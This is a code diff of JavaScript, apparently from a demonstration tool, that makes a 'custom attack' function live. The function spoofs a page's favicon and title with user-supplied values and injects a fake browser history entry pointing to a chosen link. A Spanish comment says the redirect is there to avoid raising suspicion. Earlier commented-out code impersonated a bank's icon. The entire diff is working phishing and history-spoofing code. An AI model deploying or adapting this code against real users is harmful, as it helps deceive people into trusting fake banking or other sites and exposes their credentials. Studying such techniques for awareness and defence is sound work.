@@ -419,21 +419,24 @@ function makeHistoryInyection () {
 
 function makeCustomAttack (event) {
     event.preventDefault();
-    alert();
-//     let random = Math.floor(Math.random() * 7777);
+    var name = document.getElementById('websiteAttackName'),
+        link = document.getElementById('websiteAttackLink'),
+        iconLink = document.getElementById('websiteAttackIcon');
 
-//     // Cambiamos el favicon y el título
-//     var favicon = document.getElementById('favicon'),
-//         lastLocation = window.location;
+    let random = Math.floor(Math.random() * 7777);
 
-//     favicon.href = 'assets/img/americanBank.ico';
-//     document.title = 'Prueba';
+    // Cambiamos el favicon y el título
+    var favicon = document.getElementById('favicon'),
+        lastLocation = window.location;
 
-//     // Redireccionamos a nuestra web para no levantar sospechas
-//     setTimeout(() => {
-//         history.pushState({id: random}, '', `?redirect=https://www.google.com`);
-//         window.location = `${lastLocation.protocol}//${lastLocation.host}`;  
-//     }, 100);
+    favicon.href = iconLink.value;
+    document.title = name.value;
+
+    // Redireccionamos a nuestra web para no levantar sospechas
+    setTimeout(() => {
+        history.pushState({id: random}, '', `?redirect=https://${link.value}`);
+        window.location = `${lastLocation.protocol}//${lastLocation.host}`;  
+    }, 100);
 }
 
 /**
